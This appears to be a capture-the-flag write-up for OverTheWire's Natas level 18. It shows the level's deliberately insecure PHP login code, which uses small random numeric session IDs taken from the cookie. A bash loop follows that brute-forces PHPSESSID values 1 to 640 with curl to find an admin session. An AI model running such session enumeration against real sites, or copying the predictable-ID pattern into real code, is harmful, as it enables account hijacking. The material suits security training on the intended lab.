# Natas 18-> 19

```
http://natas18.natas.labs.overthewire.org
```

```
Username: natas18
```

This time we have a login screen with source code.


```php
$maxid = 640; // 640 should be enough for everyone

function isValidAdminLogin() { /* {{{ */
    if($_REQUEST["username"] == "admin") {
    /* This method of authentication appears to be unsafe and has been disabled for now. */
        //return 1;
    }

    return 0;
}
/* }}} */
function isValidID($id) { /* {{{ */
    return is_numeric($id);
}
/* }}} */
function createID($user) { /* {{{ */
    global $maxid;
    return rand(1, $maxid);
}
/* }}} */
function debug($msg) { /* {{{ */
    if(array_key_exists("debug", $_GET)) {
        print "DEBUG: $msg<br>";
    }
}
/* }}} */
function my_session_start() { /* {{{ */
    if(array_key_exists("PHPSESSID", $_COOKIE) and isValidID($_COOKIE["PHPSESSID"])) {
    if(!session_start()) {
        debug("Session start failed");
        return false;
    } else {
        debug("Session start ok");
        if(!array_key_exists("admin", $_SESSION)) {
        debug("Session was old: admin flag set");
        $_SESSION["admin"] = 0; // backwards compatible, secure
        }
        return true;
    }
    }

    return false;
}
/* }}} */
function print_credentials() { /* {{{ */
    if($_SESSION and array_key_exists("admin", $_SESSION) and $_SESSION["admin"] == 1) {
    print "You are an admin. The credentials for the next level are:<br>";
    print "<pre>Username: natas19\n";
    print "Password: <censored></pre>";
    } else {
    print "You are logged in as a regular user. Login as an admin to retrieve credentials for natas19.";
    }
}
/* }}} */

$showform = true;
if(my_session_start()) {
    print_credentials();
    $showform = false;
} else {
    if(array_key_exists("username", $_REQUEST) && array_key_exists("password", $_REQUEST)) {
    session_id(createID($_REQUEST["username"]));
    session_start();
    $_SESSION["admin"] = isValidAdminLogin();
    debug("New session started");
    $showform = false;
    print_credentials();
    }
} 

if($showform) {
?>

<p>
Please login with your admin account to retrieve credentials for natas19.
</p>

<form action="index.php" method="POST">
Username: <input name="username"><br>
Password: <input name="password"><br>
<input type="submit" value="Login" />
</form>
<? }
```


Again, it uses `$_REQUEST`.  
Anyway, if we enter any value for both user and password, it says:

```
 You are logged in as a regular user. Login as an admin to retrieve credentials for natas19.
```

Let's use `curl`.  

```bash
$ curl --user natas18:${NATAS18_PASSWD} --head "http://natas18.natas.labs.overthewire.org/index.php?username=natas19&password=hehe"

HTTP/1.1 200 OK
Date: Thu, 06 Oct 2016 03:13:26 GMT
Server: Apache/2.4.7 (Ubuntu)
X-Powered-By: PHP/5.5.9-1ubuntu4.20
Set-Cookie: PHPSESSID=312; path=/; HttpOnly
Expires: Thu, 19 Nov 1981 08:52:00 GMT
Cache-Control: no-store, no-cache, must-revalidate, post-check=0, pre-check=0
Pragma: no-cache
Content-Type: text/html
```

So basically, when calling `session_id(createID($_REQUEST["username"]));`. The username is irrelevant since `createID` returns a `rand` value from 1 to 640 (`$maxid`) and create a `PHPSESSID`. Which as we can see, we can set it manually :-)  

Let's keep with `curl`.

```bash
for i in `seq 1 640`;
do
    curl \
        -s --user natas18:${NATAS18_PASSWD} \
        --cookie "PHPSESSID=$i" \
    "http://natas18.natas.labs.overthewire.org/index.php?username=a&password=a"|lynx -stdin -dump;
done

```

* php
* http://php.net/manual/en/function.session-id.php
* http://php.net/manual/en/function.session-start.php
* http://php.net/manual/en/reserved.variables.session.php
* curl
* lynx
* seq
